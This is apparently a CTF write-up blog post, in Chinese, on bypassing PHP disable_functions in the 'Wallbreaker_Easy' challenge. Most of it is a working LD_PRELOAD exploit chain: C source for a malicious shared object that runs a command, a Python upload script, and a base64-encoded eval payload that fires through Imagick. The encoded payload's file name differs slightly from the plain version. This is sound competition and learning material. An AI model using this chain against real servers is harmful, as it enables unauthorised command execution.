---
title: "PHP特性相关"
date: 2020-09-26
description: "什么叫世界上最好的语言啊（后仰"
categories: [
  "CTF"
]
tags: [
  "PHP"
]
---

## Wallbreaker_Easy

这题用不上但是记一下:[绕open_basedir](https://www.leavesongs.com/PHP/php-bypass-open-basedir-list-directory.html)

传统艺能LD_PRELOAD绕disable_functions

祖传so代码

```c
#define _GNU_SOURCE

#include <stdlib.h>
#include <stdio.h>
#include <string.h>
extern char** environ;
__attribute__ ((__constructor__)) void preload (void)
{
    const char* cmdline = getenv("CMD");
    int i;
    for (i = 0; environ[i]; ++i) {
            if (strstr(environ[i], "LD_PRELOAD")) {
                    environ[i][0] = ' ';
            }
    }
    system(cmdline);
}
```

上传so

```python
import requests

url = "http://a2300c73-bc34-4236-b95b-c1be913a7719.node3.buuoj.cn/"
data = {'backdoor':'''move_uploaded_file($_FILES["file"]["tmp_name"],'/tmp/8f3186a04d945279cc90a84497823269/evil.so');'''}
files = {'file': open("evil.so", 'rb')}
response = requests.post(url, data=data, files=files)
print(response.request.body)
```

b64编码一下，注意魔法后缀`ilbm`，`new Imagick`的时候可以直接up出imagick进程从而触发preload（原理有待研究，可能是ilbm需要外部调用进行一些处理）

```python
import base64
print(base64.b64encode('''$mypath = "/tmp/8f3186a04d945279cc90a84497823269/";
putenv("CMD=/readflag" . " > " . $mypath . "flag 2>&1");
putenv("LD_PRELOAD=" . $mypath . "evil.so");

file_put_contents($mypath . "evil.ilbm", "");
$im = new Imagick($mypath . "evil.ilbm");'''.encode('utf-8')))
```

payload打一下

```
backdoor=eval(base64_decode("JG15cGF0aCA9ICIvdG1wLzhmMzE4NmEwNGQ5NDUyNzljYzkwYTg0NDk3ODIzMjY5LyI7CnB1dGVudigiQ01EPS9yZWFkZmxhZyIgLiAiID4gIiAuICRteXBhdGggLiAiZmxhZyAyPiYxIik7CnB1dGVudigiTERfUFJFTE9BRD0iIC4gJG15cGF0aCAuICJldmlsLnNvIik7CgpmaWxlX3B1dF9jb250ZW50cygkbXlwYXRoIC4gImV4cDEuaWxibSIsICIiKTsKJGltID0gbmV3IEltYWdpY2soJG15cGF0aCAuICJleHAxLmlsYm0iKTs="));
```